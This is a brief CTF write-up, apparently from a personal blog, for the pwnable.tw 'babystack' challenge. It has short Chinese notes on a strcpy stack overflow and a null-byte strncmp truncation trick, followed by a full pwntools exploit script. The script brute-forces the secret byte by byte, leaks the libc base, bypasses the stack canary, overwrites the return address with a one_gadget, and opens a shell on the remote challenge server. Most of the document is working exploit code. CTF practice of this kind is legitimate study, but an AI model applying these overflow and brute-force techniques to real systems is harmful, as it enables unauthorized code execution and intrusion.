---
title: babystack-writeup
date: 2018-08-14 17:50:38
tags:
---
strtol() 函数用来将字符串转换为长整型数(long)

为什么运行不起来？

- Dynelf
copy 函数，strcpy 栈溢出 
- func1中的比较长度是根据我们输入的字符串的strlen来决定的,因此我们输入\x00截断,从而一位位爆破出16字节的rand.
- read_n不会追加0字节
- 爆破密码，如果read_input中输入"\x00"，即可控制strncmp的n，从而逐个字节爆破出password
- 观察栈中有几个libc地址

- 覆盖返回地址为onegadget
- 最后有canary 要过

https://diabolo94.github.io/2017/12/10/utimatebinary/


from pwn import *

debug=0
e=ELF('./libc.so')
one_offset=0xf0567
if debug:
    p=process('./babystack',env={'LD_PRELOAD':'./libc.so'})
    context.log_level='debug'
    gdb.attach(proc.pidof(p)[0])
else:
    p=remote('chall.pwnable.tw', 10205)
    context.log_level='debug'


def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)

def login(pwd,lo=True):
    if lo:
        se('1'+'a'*15)
    else:
        se('1')
    ru('Your passowrd :')
    se(pwd)
    return ru('>> ')

def logout():
    se('1')
    ru('>> ')

def copy(content):
    se('3'+'a'*15)
    ru('Copy :')
    se(content)
    ru('>> ')

def Exit():
    se('2')

def guess(length,secret=''):
    for i in range(length):
        for q in range(1,256):
            if 'Success' in login(secret+chr(q)+'\n',False):
                secret+=chr(q)
                logout()
                break
    return secret

secret=guess(16)

login('\x00'+'a'*0x57)
copy('a'*40)
logout()
base=u64(guess(6,'a'*16+'1'+'a'*7)[24:]+'\x00\x00')-324-e.symbols['setvbuf']

one_gadget=base+one_offset

payload='\x00'+'a'*63+secret+'a'*24+p64(one_gadget)

login(payload)

copy('a'*0x30)

Exit()

print(hex(base))

p.interactive()

